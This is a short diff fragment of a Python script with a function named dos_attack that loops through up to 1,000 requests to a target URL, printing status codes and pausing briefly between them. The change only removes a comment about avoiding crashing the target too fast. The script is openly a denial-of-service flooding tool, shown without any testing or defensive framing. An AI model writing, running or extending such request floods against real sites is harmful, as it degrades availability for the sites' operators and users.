@@ -11,7 +11,7 @@ def dos_attack(url, num_requests=1000):
             print(f"Request {i+1}: {response.status_code}")
         except Exception as e:
             print(f"Error on request {i+1}: {e}")
-        time.sleep(0.1)  # Adding delay between requests to avoid crashing too fast
+        time.sleep(0.1)
 
 
 if __name__ == "__main__":
